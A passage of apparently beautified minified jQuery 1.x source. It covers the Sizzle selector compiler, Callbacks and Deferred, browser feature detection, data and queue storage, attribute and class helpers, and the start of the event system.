                    }), s = s.slice(n.length));
                    if (!n) break
                }
                return t ? s.length : s ? at.error(e) : k(e, l).slice(0)
            }

            function yt(e) {
                var t = 0,
                    n = e.length,
                    r = "";
                for (; n > t; t++) r += e[t].value;
                return r
            }

            function vt(e, t, n) {
                var r = t.dir,
                    o = n && "parentNode" === r,
                    a = C++;
                return t.first ? function(t, n, i) {
                    while (t = t[r])
                        if (1 === t.nodeType || o) return e(t, n, i)
                } : function(t, n, s) {
                    var l, u, c, p = T + " " + a;
                    if (s) {
                        while (t = t[r])
                            if ((1 === t.nodeType || o) && e(t, n, s)) return !0
                    } else
                        while (t = t[r])
                            if (1 === t.nodeType || o)
                                if (c = t[b] || (t[b] = {}), (u = c[r]) && u[0] === p) {
                                    if ((l = u[1]) === !0 || l === i) return l === !0
                                } else if (u = c[r] = [p], u[1] = e(t, n, s) || i, u[1] === !0) return !0
                }
            }

            function bt(e) {
                return e.length > 1 ? function(t, n, r) {
                    var i = e.length;
                    while (i--)
                        if (!e[i](t, n, r)) return !1;
                    return !0
                } : e[0]
            }

            function xt(e, t, n, r, i) {
                var o, a = [],
                    s = 0,
                    l = e.length,
                    u = null != t;
                for (; l > s; s++)(o = e[s]) && (!n || n(o, r, i)) && (a.push(o), u && t.push(s));
                return a
            }

            function wt(e, t, n, r, i, o) {
                return r && !r[b] && (r = wt(r)), i && !i[b] && (i = wt(i, o)), lt(function(o, a, s, l) {
                    var u, c, p, f = [],
                        d = [],
                        h = a.length,
                        g = o || Nt(t || "*", s.nodeType ? [s] : s, []),
                        m = !e || !o && t ? g : xt(g, f, e, s, l),
                        y = n ? i || (o ? e : h || r) ? [] : a : m;
                    if (n && n(m, y, s, l), r) {
                        u = xt(y, d), r(u, [], s, l), c = u.length;
                        while (c--)(p = u[c]) && (y[d[c]] = !(m[d[c]] = p))
                    }
                    if (o) {
                        if (i || e) {
                            if (i) {
                                u = [], c = y.length;
                                while (c--)(p = y[c]) && u.push(m[c] = p);
                                i(null, y = [], u, l)
                            }
                            c = y.length;
                            while (c--)(p = y[c]) && (u = i ? F.call(o, p) : f[c]) > -1 && (o[u] = !(a[u] = p))
                        }
                    } else y = xt(y === a ? y.splice(h, y.length) : y), i ? i(null, a, y, l) : M.apply(a, y)
                })
            }

            function Tt(e) {
                var t, n, r, i = e.length,
                    a = o.relative[e[0].type],
                    s = a || o.relative[" "],
                    l = a ? 1 : 0,
                    c = vt(function(e) {
                        return e === t
                    }, s, !0),
                    p = vt(function(e) {
                        return F.call(t, e) > -1
                    }, s, !0),
                    f = [
                        function(e, n, r) {
                            return !a && (r || n !== u) || ((t = n).nodeType ? c(e, n, r) : p(e, n, r))
                        }
                    ];
                for (; i > l; l++)
                    if (n = o.relative[e[l].type]) f = [vt(bt(f), n)];
                    else {
                        if (n = o.filter[e[l].type].apply(null, e[l].matches), n[b]) {
                            for (r = ++l; i > r; r++)
                                if (o.relative[e[r].type]) break;
                            return wt(l > 1 && bt(f), l > 1 && yt(e.slice(0, l - 1).concat({
                                value: " " === e[l - 2].type ? "*" : ""
                            })).replace(z, "$1"), n, r > l && Tt(e.slice(l, r)), i > r && Tt(e = e.slice(r)), i > r && yt(e))
                        }
                        f.push(n)
                    }
                return bt(f)
            }

            function Ct(e, t) {
                var n = 0,
                    r = t.length > 0,
                    a = e.length > 0,
                    s = function(s, l, c, p, d) {
                        var h, g, m, y = [],
                            v = 0,
                            b = "0",
                            x = s && [],
                            w = null != d,
                            C = u,
                            N = s || a && o.find.TAG("*", d && l.parentNode || l),
                            k = T += null == C ? 1 : Math.random() || .1;
                        for (w && (u = l !== f && l, i = n); null != (h = N[b]); b++) {
                            if (a && h) {
                                g = 0;
                                while (m = e[g++])
                                    if (m(h, l, c)) {
                                        p.push(h);
                                        break
                                    }
                                w && (T = k, i = ++n)
                            }
                            r && ((h = !m && h) && v--, s && x.push(h))
                        }
                        if (v += b, r && b !== v) {
                            g = 0;
                            while (m = t[g++]) m(x, y, l, c);
                            if (s) {
                                if (v > 0)
                                    while (b--) x[b] || y[b] || (y[b] = q.call(p));
                                y = xt(y)
                            }
                            M.apply(p, y), w && !s && y.length > 0 && v + t.length > 1 && at.uniqueSort(p)
                        }
                        return w && (T = k, u = C), x
                    };
                return r ? lt(s) : s
            }
            l = at.compile = function(e, t) {
                var n, r = [],
                    i = [],
                    o = E[e + " "];
                if (!o) {
                    t || (t = mt(e)), n = t.length;
                    while (n--) o = Tt(t[n]), o[b] ? r.push(o) : i.push(o);
                    o = E(e, Ct(i, r))
                }
                return o
            };

            function Nt(e, t, n) {
                var r = 0,
                    i = t.length;
                for (; i > r; r++) at(e, t[r], n);
                return n
            }

            function kt(e, t, n, i) {
                var a, s, u, c, p, f = mt(e);
                if (!i && 1 === f.length) {
                    if (s = f[0] = f[0].slice(0), s.length > 2 && "ID" === (u = s[0]).type && r.getById && 9 === t.nodeType && h && o.relative[s[1].type]) {
                        if (t = (o.find.ID(u.matches[0].replace(rt, it), t) || [])[0], !t) return n;
                        e = e.slice(s.shift().value.length)
                    }
                    a = Q.needsContext.test(e) ? 0 : s.length;
                    while (a--) {
                        if (u = s[a], o.relative[c = u.type]) break;
                        if ((p = o.find[c]) && (i = p(u.matches[0].replace(rt, it), V.test(s[0].type) && t.parentNode || t))) {
                            if (s.splice(a, 1), e = i.length && yt(s), !e) return M.apply(n, i), n;
                            break
                        }
                    }
                }
                return l(e, f)(i, t, !h, n, V.test(e)), n
            }
            r.sortStable = b.split("").sort(A).join("") === b, r.detectDuplicates = S, p(), r.sortDetached = ut(function(e) {
                return 1 & e.compareDocumentPosition(f.createElement("div"))
            }), ut(function(e) {
                return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
            }) || ct("type|href|height|width", function(e, n, r) {
                return r ? t : e.getAttribute(n, "type" === n.toLowerCase() ? 1 : 2)
            }), r.attributes && ut(function(e) {
                return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
            }) || ct("value", function(e, n, r) {
                return r || "input" !== e.nodeName.toLowerCase() ? t : e.defaultValue
            }), ut(function(e) {
                return null == e.getAttribute("disabled")
            }) || ct(B, function(e, n, r) {
                var i;
                return r ? t : (i = e.getAttributeNode(n)) && i.specified ? i.value : e[n] === !0 ? n.toLowerCase() : null
            }), x.find = at, x.expr = at.selectors, x.expr[":"] = x.expr.pseudos, x.unique = at.uniqueSort, x.text = at.getText, x.isXMLDoc = at.isXML, x.contains = at.contains
        }(e);
    var O = {};

    function F(e) {
        var t = O[e] = {};
        return x.each(e.match(T) || [], function(e, n) {
            t[n] = !0
        }), t
    }
    x.Callbacks = function(e) {
        e = "string" == typeof e ? O[e] || F(e) : x.extend({}, e);
        var n, r, i, o, a, s, l = [],
            u = !e.once && [],
            c = function(t) {
                for (r = e.memory && t, i = !0, a = s || 0, s = 0, o = l.length, n = !0; l && o > a; a++)
                    if (l[a].apply(t[0], t[1]) === !1 && e.stopOnFalse) {
                        r = !1;
                        break
                    }
                n = !1, l && (u ? u.length && c(u.shift()) : r ? l = [] : p.disable())
            },
            p = {
                add: function() {
                    if (l) {
                        var t = l.length;
                        (function i(t) {
                            x.each(t, function(t, n) {
                                var r = x.type(n);
                                "function" === r ? e.unique && p.has(n) || l.push(n) : n && n.length && "string" !== r && i(n)
                            })
                        })(arguments), n ? o = l.length : r && (s = t, c(r))
                    }
                    return this
                },
                remove: function() {
                    return l && x.each(arguments, function(e, t) {
                        var r;
                        while ((r = x.inArray(t, l, r)) > -1) l.splice(r, 1), n && (o >= r && o--, a >= r && a--)
                    }), this
                },
                has: function(e) {
                    return e ? x.inArray(e, l) > -1 : !(!l || !l.length)
                },
                empty: function() {
                    return l = [], o = 0, this
                },
                disable: function() {
                    return l = u = r = t, this
                },
                disabled: function() {
                    return !l
                },
                lock: function() {
                    return u = t, r || p.disable(), this
                },
                locked: function() {
                    return !u
                },
                fireWith: function(e, t) {
                    return !l || i && !u || (t = t || [], t = [e, t.slice ? t.slice() : t], n ? u.push(t) : c(t)), this
                },
                fire: function() {
                    return p.fireWith(this, arguments), this
                },
                fired: function() {
                    return !!i
                }
            };
        return p
    }, x.extend({
        Deferred: function(e) {
            var t = [
                    ["resolve", "done", x.Callbacks("once memory"), "resolved"],
                    ["reject", "fail", x.Callbacks("once memory"), "rejected"],
                    ["notify", "progress", x.Callbacks("memory")]
                ],
                n = "pending",
                r = {
                    state: function() {
                        return n
                    },
                    always: function() {
                        return i.done(arguments).fail(arguments), this
                    },
                    then: function() {
                        var e = arguments;
                        return x.Deferred(function(n) {
                            x.each(t, function(t, o) {
                                var a = o[0],
                                    s = x.isFunction(e[t]) && e[t];
                                i[o[1]](function() {
                                    var e = s && s.apply(this, arguments);
                                    e && x.isFunction(e.promise) ? e.promise().done(n.resolve).fail(n.reject).progress(n.notify) : n[a + "With"](this === r ? n.promise() : this, s ? [e] : arguments)
                                })
                            }), e = null
                        }).promise()
                    },
                    promise: function(e) {
                        return null != e ? x.extend(e, r) : r
                    }
                },
                i = {};
            return r.pipe = r.then, x.each(t, function(e, o) {
                var a = o[2],
                    s = o[3];
                r[o[1]] = a.add, s && a.add(function() {
                    n = s
                }, t[1 ^ e][2].disable, t[2][2].lock), i[o[0]] = function() {
                    return i[o[0] + "With"](this === i ? r : this, arguments), this
                }, i[o[0] + "With"] = a.fireWith
            }), r.promise(i), e && e.call(i, i), i
        },
        when: function(e) {
            var t = 0,
                n = g.call(arguments),
                r = n.length,
                i = 1 !== r || e && x.isFunction(e.promise) ? r : 0,
                o = 1 === i ? e : x.Deferred(),
                a = function(e, t, n) {
                    return function(r) {
                        t[e] = this, n[e] = arguments.length > 1 ? g.call(arguments) : r, n === s ? o.notifyWith(t, n) : --i || o.resolveWith(t, n)
                    }
                },
                s, l, u;
            if (r > 1)
                for (s = Array(r), l = Array(r), u = Array(r); r > t; t++) n[t] && x.isFunction(n[t].promise) ? n[t].promise().done(a(t, u, n)).fail(o.reject).progress(a(t, l, s)) : --i;
            return i || o.resolveWith(u, n), o.promise()
        }
    }), x.support = function(t) {
        var n, r, o, s, l, u, c, p, f, d = a.createElement("div");
        if (d.setAttribute("className", "t"), d.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", n = d.getElementsByTagName("*") || [], r = d.getElementsByTagName("a")[0], !r || !r.style || !n.length) return t;
        s = a.createElement("select"), u = s.appendChild(a.createElement("option")), o = d.getElementsByTagName("input")[0], r.style.cssText = "top:1px;float:left;opacity:.5", t.getSetAttribute = "t" !== d.className, t.leadingWhitespace = 3 === d.firstChild.nodeType, t.tbody = !d.getElementsByTagName("tbody").length, t.htmlSerialize = !!d.getElementsByTagName("link").length, t.style = /top/.test(r.getAttribute("style")), t.hrefNormalized = "/a" === r.getAttribute("href"), t.opacity = /^0.5/.test(r.style.opacity), t.cssFloat = !!r.style.cssFloat, t.checkOn = !!o.value, t.optSelected = u.selected, t.enctype = !!a.createElement("form").enctype, t.html5Clone = "<:nav></:nav>" !== a.createElement("nav").cloneNode(!0).outerHTML, t.inlineBlockNeedsLayout = !1, t.shrinkWrapBlocks = !1, t.pixelPosition = !1, t.deleteExpando = !0, t.noCloneEvent = !0, t.reliableMarginRight = !0, t.boxSizingReliable = !0, o.checked = !0, t.noCloneChecked = o.cloneNode(!0).checked, s.disabled = !0, t.optDisabled = !u.disabled;
        try {
            delete d.test
        } catch (h) {
            t.deleteExpando = !1
        }
        o = a.createElement("input"), o.setAttribute("value", ""), t.input = "" === o.getAttribute("value"), o.value = "t", o.setAttribute("type", "radio"), t.radioValue = "t" === o.value, o.setAttribute("checked", "t"), o.setAttribute("name", "t"), l = a.createDocumentFragment(), l.appendChild(o), t.appendChecked = o.checked, t.checkClone = l.cloneNode(!0).cloneNode(!0).lastChild.checked, d.attachEvent && (d.attachEvent("onclick", function() {
            t.noCloneEvent = !1
        }), d.cloneNode(!0).click());
        for (f in {
            submit: !0,
            change: !0,
            focusin: !0
        }) d.setAttribute(c = "on" + f, "t"), t[f + "Bubbles"] = c in e || d.attributes[c].expando === !1;
        d.style.backgroundClip = "content-box", d.cloneNode(!0).style.backgroundClip = "", t.clearCloneStyle = "content-box" === d.style.backgroundClip;
        for (f in x(t)) break;
        return t.ownLast = "0" !== f, x(function() {
            var n, r, o, s = "padding:0;margin:0;border:0;display:block;box-sizing:content-box;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;",
                l = a.getElementsByTagName("body")[0];
            l && (n = a.createElement("div"), n.style.cssText = "border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px", l.appendChild(n).appendChild(d), d.innerHTML = "<table><tr><td></td><td>t</td></tr></table>", o = d.getElementsByTagName("td"), o[0].style.cssText = "padding:0;margin:0;border:0;display:none", p = 0 === o[0].offsetHeight, o[0].style.display = "", o[1].style.display = "none", t.reliableHiddenOffsets = p && 0 === o[0].offsetHeight, d.innerHTML = "", d.style.cssText = "box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding:1px;border:1px;display:block;width:4px;margin-top:1%;position:absolute;top:1%;", x.swap(l, null != l.style.zoom ? {
                zoom: 1
            } : {}, function() {
                t.boxSizing = 4 === d.offsetWidth
            }), e.getComputedStyle && (t.pixelPosition = "1%" !== (e.getComputedStyle(d, null) || {}).top, t.boxSizingReliable = "4px" === (e.getComputedStyle(d, null) || {
                width: "4px"
            }).width, r = d.appendChild(a.createElement("div")), r.style.cssText = d.style.cssText = s, r.style.marginRight = r.style.width = "0", d.style.width = "1px", t.reliableMarginRight = !parseFloat((e.getComputedStyle(r, null) || {}).marginRight)), typeof d.style.zoom !== i && (d.innerHTML = "", d.style.cssText = s + "width:1px;padding:1px;display:inline;zoom:1", t.inlineBlockNeedsLayout = 3 === d.offsetWidth, d.style.display = "block", d.innerHTML = "<div></div>", d.firstChild.style.width = "5px", t.shrinkWrapBlocks = 3 !== d.offsetWidth, t.inlineBlockNeedsLayout && (l.style.zoom = 1)), l.removeChild(n), n = d = o = r = null)
        }), n = s = l = u = r = o = null, t
    }({});
    var B = /(?:\{[\s\S]*\}|\[[\s\S]*\])$/,
        P = /([A-Z])/g;

    function R(e, n, r, i) {
        if (x.acceptData(e)) {
            var o, a, s = x.expando,
                l = e.nodeType,
                u = l ? x.cache : e,
                c = l ? e[s] : e[s] && s;
            if (c && u[c] && (i || u[c].data) || r !== t || "string" != typeof n) return c || (c = l ? e[s] = p.pop() || x.guid++ : s), u[c] || (u[c] = l ? {} : {
                toJSON: x.noop
            }), ("object" == typeof n || "function" == typeof n) && (i ? u[c] = x.extend(u[c], n) : u[c].data = x.extend(u[c].data, n)), a = u[c], i || (a.data || (a.data = {}), a = a.data), r !== t && (a[x.camelCase(n)] = r), "string" == typeof n ? (o = a[n], null == o && (o = a[x.camelCase(n)])) : o = a, o
        }
    }

    function W(e, t, n) {
        if (x.acceptData(e)) {
            var r, i, o = e.nodeType,
                a = o ? x.cache : e,
                s = o ? e[x.expando] : x.expando;
            if (a[s]) {
                if (t && (r = n ? a[s] : a[s].data)) {
                    x.isArray(t) ? t = t.concat(x.map(t, x.camelCase)) : t in r ? t = [t] : (t = x.camelCase(t), t = t in r ? [t] : t.split(" ")), i = t.length;
                    while (i--) delete r[t[i]];
                    if (n ? !I(r) : !x.isEmptyObject(r)) return
                }(n || (delete a[s].data, I(a[s]))) && (o ? x.cleanData([e], !0) : x.support.deleteExpando || a != a.window ? delete a[s] : a[s] = null)
            }
        }
    }
    x.extend({
        cache: {},
        noData: {
            applet: !0,
            embed: !0,
            object: "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
        },
        hasData: function(e) {
            return e = e.nodeType ? x.cache[e[x.expando]] : e[x.expando], !!e && !I(e)
        },
        data: function(e, t, n) {
            return R(e, t, n)
        },
        removeData: function(e, t) {
            return W(e, t)
        },
        _data: function(e, t, n) {
            return R(e, t, n, !0)
        },
        _removeData: function(e, t) {
            return W(e, t, !0)
        },
        acceptData: function(e) {
            if (e.nodeType && 1 !== e.nodeType && 9 !== e.nodeType) return !1;
            var t = e.nodeName && x.noData[e.nodeName.toLowerCase()];
            return !t || t !== !0 && e.getAttribute("classid") === t
        }
    }), x.fn.extend({
        data: function(e, n) {
            var r, i, o = null,
                a = 0,
                s = this[0];
            if (e === t) {
                if (this.length && (o = x.data(s), 1 === s.nodeType && !x._data(s, "parsedAttrs"))) {
                    for (r = s.attributes; r.length > a; a++) i = r[a].name, 0 === i.indexOf("data-") && (i = x.camelCase(i.slice(5)), $(s, i, o[i]));
                    x._data(s, "parsedAttrs", !0)
                }
                return o
            }
            return "object" == typeof e ? this.each(function() {
                x.data(this, e)
            }) : arguments.length > 1 ? this.each(function() {
                x.data(this, e, n)
            }) : s ? $(s, e, x.data(s, e)) : null
        },
        removeData: function(e) {
            return this.each(function() {
                x.removeData(this, e)
            })
        }
    });

    function $(e, n, r) {
        if (r === t && 1 === e.nodeType) {
            var i = "data-" + n.replace(P, "-$1").toLowerCase();
            if (r = e.getAttribute(i), "string" == typeof r) {
                try {
                    r = "true" === r ? !0 : "false" === r ? !1 : "null" === r ? null : +r + "" === r ? +r : B.test(r) ? x.parseJSON(r) : r
                } catch (o) {}
                x.data(e, n, r)
            } else r = t
        }
        return r
    }

    function I(e) {
        var t;
        for (t in e)
            if (("data" !== t || !x.isEmptyObject(e[t])) && "toJSON" !== t) return !1;
        return !0
    }
    x.extend({
        queue: function(e, n, r) {
            var i;
            return e ? (n = (n || "fx") + "queue", i = x._data(e, n), r && (!i || x.isArray(r) ? i = x._data(e, n, x.makeArray(r)) : i.push(r)), i || []) : t
        },
        dequeue: function(e, t) {
            t = t || "fx";
            var n = x.queue(e, t),
                r = n.length,
                i = n.shift(),
                o = x._queueHooks(e, t),
                a = function() {
                    x.dequeue(e, t)
                };
            "inprogress" === i && (i = n.shift(), r--), i && ("fx" === t && n.unshift("inprogress"), delete o.stop, i.call(e, a, o)), !r && o && o.empty.fire()
        },
        _queueHooks: function(e, t) {
            var n = t + "queueHooks";
            return x._data(e, n) || x._data(e, n, {
                empty: x.Callbacks("once memory").add(function() {
                    x._removeData(e, t + "queue"), x._removeData(e, n)
                })
            })
        }
    }), x.fn.extend({
        queue: function(e, n) {
            var r = 2;
            return "string" != typeof e && (n = e, e = "fx", r--), r > arguments.length ? x.queue(this[0], e) : n === t ? this : this.each(function() {
                var t = x.queue(this, e, n);
                x._queueHooks(this, e), "fx" === e && "inprogress" !== t[0] && x.dequeue(this, e)
            })
        },
        dequeue: function(e) {
            return this.each(function() {
                x.dequeue(this, e)
            })
        },
        delay: function(e, t) {
            return e = x.fx ? x.fx.speeds[e] || e : e, t = t || "fx", this.queue(t, function(t, n) {
                var r = setTimeout(t, e);
                n.stop = function() {
                    clearTimeout(r)
                }
            })
        },
        clearQueue: function(e) {
            return this.queue(e || "fx", [])
        },
        promise: function(e, n) {
            var r, i = 1,
                o = x.Deferred(),
                a = this,
                s = this.length,
                l = function() {
                    --i || o.resolveWith(a, [a])
                };
            "string" != typeof e && (n = e, e = t), e = e || "fx";
            while (s--) r = x._data(a[s], e + "queueHooks"), r && r.empty && (i++, r.empty.add(l));
            return l(), o.promise(n)
        }
    });
    var z, X, U = /[\t\r\n\f]/g,
        V = /\r/g,
        Y = /^(?:input|select|textarea|button|object)$/i,
        J = /^(?:a|area)$/i,
        G = /^(?:checked|selected)$/i,
        Q = x.support.getSetAttribute,
        K = x.support.input;
    x.fn.extend({
        attr: function(e, t) {
            return x.access(this, x.attr, e, t, arguments.length > 1)
        },
        removeAttr: function(e) {
            return this.each(function() {
                x.removeAttr(this, e)
            })
        },
        prop: function(e, t) {
            return x.access(this, x.prop, e, t, arguments.length > 1)
        },
        removeProp: function(e) {
            return e = x.propFix[e] || e, this.each(function() {
                try {
                    this[e] = t, delete this[e]
                } catch (n) {}
            })
        },
        addClass: function(e) {
            var t, n, r, i, o, a = 0,
                s = this.length,
                l = "string" == typeof e && e;
            if (x.isFunction(e)) return this.each(function(t) {
                x(this).addClass(e.call(this, t, this.className))
            });
            if (l)
                for (t = (e || "").match(T) || []; s > a; a++)
                    if (n = this[a], r = 1 === n.nodeType && (n.className ? (" " + n.className + " ").replace(U, " ") : " ")) {
                        o = 0;
                        while (i = t[o++]) 0 > r.indexOf(" " + i + " ") && (r += i + " ");
                        n.className = x.trim(r)
                    }
            return this
        },
        removeClass: function(e) {
            var t, n, r, i, o, a = 0,
                s = this.length,
                l = 0 === arguments.length || "string" == typeof e && e;
            if (x.isFunction(e)) return this.each(function(t) {
                x(this).removeClass(e.call(this, t, this.className))
            });
            if (l)
                for (t = (e || "").match(T) || []; s > a; a++)
                    if (n = this[a], r = 1 === n.nodeType && (n.className ? (" " + n.className + " ").replace(U, " ") : "")) {
                        o = 0;
                        while (i = t[o++])
                            while (r.indexOf(" " + i + " ") >= 0) r = r.replace(" " + i + " ", " ");
                        n.className = e ? x.trim(r) : ""
                    }
            return this
        },
        toggleClass: function(e, t) {
            var n = typeof e;
            return "boolean" == typeof t && "string" === n ? t ? this.addClass(e) : this.removeClass(e) : x.isFunction(e) ? this.each(function(n) {
                x(this).toggleClass(e.call(this, n, this.className, t), t)
            }) : this.each(function() {
                if ("string" === n) {
                    var t, r = 0,
                        o = x(this),
                        a = e.match(T) || [];
                    while (t = a[r++]) o.hasClass(t) ? o.removeClass(t) : o.addClass(t)
                } else(n === i || "boolean" === n) && (this.className && x._data(this, "__className__", this.className), this.className = this.className || e === !1 ? "" : x._data(this, "__className__") || "")
            })
        },
        hasClass: function(e) {
            var t = " " + e + " ",
                n = 0,
                r = this.length;
            for (; r > n; n++)
                if (1 === this[n].nodeType && (" " + this[n].className + " ").replace(U, " ").indexOf(t) >= 0) return !0;
            return !1
        },
        val: function(e) {
            var n, r, i, o = this[0]; {
                if (arguments.length) return i = x.isFunction(e), this.each(function(n) {
                    var o;
                    1 === this.nodeType && (o = i ? e.call(this, n, x(this).val()) : e, null == o ? o = "" : "number" == typeof o ? o += "" : x.isArray(o) && (o = x.map(o, function(e) {
                        return null == e ? "" : e + ""
                    })), r = x.valHooks[this.type] || x.valHooks[this.nodeName.toLowerCase()], r && "set" in r && r.set(this, o, "value") !== t || (this.value = o))
                });
                if (o) return r = x.valHooks[o.type] || x.valHooks[o.nodeName.toLowerCase()], r && "get" in r && (n = r.get(o, "value")) !== t ? n : (n = o.value, "string" == typeof n ? n.replace(V, "") : null == n ? "" : n)
            }
        }
    }), x.extend({
        valHooks: {
            option: {
                get: function(e) {
                    var t = x.find.attr(e, "value");
                    return null != t ? t : e.text
                }
            },
            select: {
                get: function(e) {
                    var t, n, r = e.options,
                        i = e.selectedIndex,
                        o = "select-one" === e.type || 0 > i,
                        a = o ? null : [],
                        s = o ? i + 1 : r.length,
                        l = 0 > i ? s : o ? i : 0;
                    for (; s > l; l++)
                        if (n = r[l], !(!n.selected && l !== i || (x.support.optDisabled ? n.disabled : null !== n.getAttribute("disabled")) || n.parentNode.disabled && x.nodeName(n.parentNode, "optgroup"))) {
                            if (t = x(n).val(), o) return t;
                            a.push(t)
                        }
                    return a
                },
                set: function(e, t) {
                    var n, r, i = e.options,
                        o = x.makeArray(t),
                        a = i.length;
                    while (a--) r = i[a], (r.selected = x.inArray(x(r).val(), o) >= 0) && (n = !0);
                    return n || (e.selectedIndex = -1), o
                }
            }
        },
        attr: function(e, n, r) {
            var o, a, s = e.nodeType;
            if (e && 3 !== s && 8 !== s && 2 !== s) return typeof e.getAttribute === i ? x.prop(e, n, r) : (1 === s && x.isXMLDoc(e) || (n = n.toLowerCase(), o = x.attrHooks[n] || (x.expr.match.bool.test(n) ? X : z)), r === t ? o && "get" in o && null !== (a = o.get(e, n)) ? a : (a = x.find.attr(e, n), null == a ? t : a) : null !== r ? o && "set" in o && (a = o.set(e, r, n)) !== t ? a : (e.setAttribute(n, r + ""), r) : (x.removeAttr(e, n), t))
        },
        removeAttr: function(e, t) {
            var n, r, i = 0,
                o = t && t.match(T);
            if (o && 1 === e.nodeType)
                while (n = o[i++]) r = x.propFix[n] || n, x.expr.match.bool.test(n) ? K && Q || !G.test(n) ? e[r] = !1 : e[x.camelCase("default-" + n)] = e[r] = !1 : x.attr(e, n, ""), e.removeAttribute(Q ? n : r)
        },
        attrHooks: {
            type: {
                set: function(e, t) {
                    if (!x.support.radioValue && "radio" === t && x.nodeName(e, "input")) {
                        var n = e.value;
                        return e.setAttribute("type", t), n && (e.value = n), t
                    }
                }
            }
        },
        propFix: {
            "for": "htmlFor",
            "class": "className"
        },
        prop: function(e, n, r) {
            var i, o, a, s = e.nodeType;
            if (e && 3 !== s && 8 !== s && 2 !== s) return a = 1 !== s || !x.isXMLDoc(e), a && (n = x.propFix[n] || n, o = x.propHooks[n]), r !== t ? o && "set" in o && (i = o.set(e, r, n)) !== t ? i : e[n] = r : o && "get" in o && null !== (i = o.get(e, n)) ? i : e[n]
        },
        propHooks: {
            tabIndex: {
                get: function(e) {
                    var t = x.find.attr(e, "tabindex");
                    return t ? parseInt(t, 10) : Y.test(e.nodeName) || J.test(e.nodeName) && e.href ? 0 : -1
                }
            }
        }
    }), X = {
        set: function(e, t, n) {
            return t === !1 ? x.removeAttr(e, n) : K && Q || !G.test(n) ? e.setAttribute(!Q && x.propFix[n] || n, n) : e[x.camelCase("default-" + n)] = e[n] = !0, n
        }
    }, x.each(x.expr.match.bool.source.match(/\w+/g), function(e, n) {
        var r = x.expr.attrHandle[n] || x.find.attr;
        x.expr.attrHandle[n] = K && Q || !G.test(n) ? function(e, n, i) {
            var o = x.expr.attrHandle[n],
                a = i ? t : (x.expr.attrHandle[n] = t) != r(e, n, i) ? n.toLowerCase() : null;
            return x.expr.attrHandle[n] = o, a
        } : function(e, n, r) {
            return r ? t : e[x.camelCase("default-" + n)] ? n.toLowerCase() : null
        }
    }), K && Q || (x.attrHooks.value = {
        set: function(e, n, r) {
            return x.nodeName(e, "input") ? (e.defaultValue = n, t) : z && z.set(e, n, r)
        }
    }), Q || (z = {
        set: function(e, n, r) {
            var i = e.getAttributeNode(r);
            return i || e.setAttributeNode(i = e.ownerDocument.createAttribute(r)), i.value = n += "", "value" === r || n === e.getAttribute(r) ? n : t
        }
    }, x.expr.attrHandle.id = x.expr.attrHandle.name = x.expr.attrHandle.coords = function(e, n, r) {
        var i;
        return r ? t : (i = e.getAttributeNode(n)) && "" !== i.value ? i.value : null
    }, x.valHooks.button = {
        get: function(e, n) {
            var r = e.getAttributeNode(n);
            return r && r.specified ? r.value : t
        },
        set: z.set
    }, x.attrHooks.contenteditable = {
        set: function(e, t, n) {
            z.set(e, "" === t ? !1 : t, n)
        }
    }, x.each(["width", "height"], function(e, n) {
        x.attrHooks[n] = {
            set: function(e, r) {
                return "" === r ? (e.setAttribute(n, "auto"), r) : t
            }
        }
    })), x.support.hrefNormalized || x.each(["href", "src"], function(e, t) {
        x.propHooks[t] = {
            get: function(e) {
                return e.getAttribute(t, 4)
            }
        }
    }), x.support.style || (x.attrHooks.style = {
        get: function(e) {
            return e.style.cssText || t
        },
        set: function(e, t) {
            return e.style.cssText = t + ""
        }
    }), x.support.optSelected || (x.propHooks.selected = {
        get: function(e) {
            var t = e.parentNode;
            return t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex), null
        }
    }), x.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
        x.propFix[this.toLowerCase()] = this
    }), x.support.enctype || (x.propFix.enctype = "encoding"), x.each(["radio", "checkbox"], function() {
        x.valHooks[this] = {
            set: function(e, n) {
                return x.isArray(n) ? e.checked = x.inArray(x(e).val(), n) >= 0 : t
            }
        }, x.support.checkOn || (x.valHooks[this].get = function(e) {
            return null === e.getAttribute("value") ? "on" : e.value
        })
    });
    var Z = /^(?:input|select|textarea)$/i,
        et = /^key/,
        tt = /^(?:mouse|contextmenu)|click/,
        nt = /^(?:focusinfocus|focusoutblur)$/,
        rt = /^([^.]*)(?:\.(.+)|)$/;

    function it() {
        return !0
    }

    function ot() {
        return !1
    }

    function at() {
        try {
            return a.activeElement
        } catch (e) {}
    }
    x.event = {
        global: {},
        add: function(e, n, r, o, a) {
            var s, l, u, c, p, f, d, h, g, m, y, v = x._data(e);
            if (v) {
                r.handler && (c = r, r = c.handler, a = c.selector), r.guid || (r.guid = x.guid++), (l = v.events) || (l = v.events = {}), (f = v.handle) || (f = v.handle = function(e) {
                    return typeof x === i || e && x.event.triggered === e.type ? t : x.event.dispatch.apply(f.elem, arguments)
                }, f.elem = e), n = (n || "").match(T) || [""], u = n.length;
                while (u--) s = rt.exec(n[u]) || [], g = y = s[1], m = (s[2] || "").split(".").sort(), g && (p = x.event.special[g] || {}, g = (a ? p.delegateType : p.bindType) || g, p = x.event.special[g] || {}, d = x.extend({
                    type: g,
                    origType: y,
                    data: o,
                    handler: r,
                    guid: r.guid,
                    selector: a,
                    needsContext: a && x.expr.match.needsContext.test(a),
                    namespace: m.join(".")
                }, c), (h = l[g]) || (h = l[g] = [], h.delegateCount = 0, p.setup && p.setup.call(e, o, m, f) !== !1 || (e.addEventListener ? e.addEventListener(g, f, !1) : e.attachEvent && e.attachEvent("on" + g, f))), p.add && (p.add.call(e, d), d.handler.guid || (d.handler.guid = r.guid)), a ? h.splice(h.delegateCount++, 0, d) : h.push(d), x.event.global[g] = !0);
                e = null
            }
        },
        remove: function(e, t, n, r, i) {
            var o, a, s, l, u, c, p, f, d, h, g, m = x.hasData(e) && x._data(e);
            if (m && (c = m.events)) {
                t = (t || "").match(T) || [""], u = t.length;
                while (u--)
                    if (s = rt.exec(t[u]) || [], d = g = s[1], h = (s[2] || "").split(".").sort(), d) {
